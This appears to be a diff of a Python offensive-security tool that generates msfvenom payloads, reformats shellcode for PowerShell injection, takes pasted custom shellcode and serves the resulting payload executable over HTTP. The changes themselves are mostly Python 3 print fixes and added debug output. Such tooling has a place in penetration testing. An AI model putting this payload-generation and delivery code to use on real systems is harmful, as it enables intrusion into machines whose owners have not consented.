@@ -1,4 +1,4 @@
-'''-*- coding: utf-8 -*-'''
+# -*- coding: utf-8 -*-
 import os
 import socket
 import re
@@ -16,7 +16,7 @@ import string
 import glob
 import readline
 import time
-#import psexec
+#from lib.psexec import *
 import urllib.request, urllib.error, urllib.parse
 from collections import OrderedDict
 import string
@@ -79,9 +79,11 @@ def msfvenomGeneration(payload, ip, port):
     print('\r', end=' ')
     sys.stdout.flush()
 
-    payload = str(p.stdout.read())
+    payload = p.stdout.read()
+    payload = payload.decode()
     compPayload = re.findall(r'"(.*?)"', payload)
-
+    print(''.join(map(str, compPayload)))
+    print()
     return ''.join(map(str, compPayload))
 
 
@@ -137,7 +139,7 @@ class InterfaceSelecta():
                     currentinterface = t.bold_green + ' *'
                 else:
                     currentinterface = ''
-                print (t.bold_yellow + str(i['num']) +  ': ' + t.normal + i['addr'] + ' (' + i['interface'] + ')' + currentinterface)
+                print(t.bold_yellow + str(i['num']) +  ': ' + t.normal + i['addr'] + ' (' + i['interface'] + ')' + currentinterface)
 
             while True:
                 interinput = prompt_toolkit.prompt("Interface > ", completer=WordCompleter([str(x+1) for x in range(self.num-1)]), style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'}))
@@ -174,7 +176,7 @@ class SHELLCODE(object):
     @staticmethod
     def windows_custom_shellcode():
         customshell = ''
-        print ('Paste custom shellcode below\nType \'END\' when done.')
+        print('Paste custom shellcode below\nType \'END\' when done.')
         while True:
             buildstr = input().rstrip()
             if buildstr == 'END':
@@ -223,7 +225,10 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 class FUNCTIONS(object):
 
     def powershellShellcodeLayout(self,powershellExec):
+
+        print("raw shell ", powershellExec)
         powershellShellcode = re.sub(r'\\x', '0x', powershellExec)
+        print("ps-shell ",powershellShellcode)
         count = 0
         newpayloadlayout = ''
         for char in powershellShellcode:
@@ -232,6 +237,7 @@ class FUNCTIONS(object):
             if count == 4:
                 newpayloadlayout += ','
                 count = 0
+        print ("newpayload ", newpayloadlayout)
         return newpayloadlayout
 
     def ServePayload(self, payloaddirectory, IP, port):
@@ -242,11 +248,11 @@ class FUNCTIONS(object):
         except KeyboardInterrupt:
             pass
         except:
-            print (t.bold_red + '\n[*] Port in use' + t.normal)
+            print(t.bold_red + '\n[*] Port in use' + t.normal)
 
     def DoServe(self, IP, payloadname, payloaddir, port, printIt):
         if printIt:
-            print (t.bold_green + "\n[*] Serving Payload On http://%s:%s/%s.exe" % (IP, port, payloadname) + t.normal)
+            print(t.bold_green + "\n[*] Serving Payload On http://%s:%s/%s.exe" % (IP, port, payloadname) + t.normal)
         a = multiprocessing.Process(
             target=self.ServePayload, args=(payloaddir, IP, port))
         a.daemon = True
@@ -298,10 +304,10 @@ class Spinner(object):
         self.x = 0
 
     def Looper(self, text):
-        print (t.bold_green, end=' ')
+        print(t.bold_green, end=' ')
         sys.stdout.write('\r')
         sys.stdout.write(text)
-        print (t.normal, end=' ')
+        print(t.normal, end=' ')
         sys.stdout.flush()
 
     def Update(self):
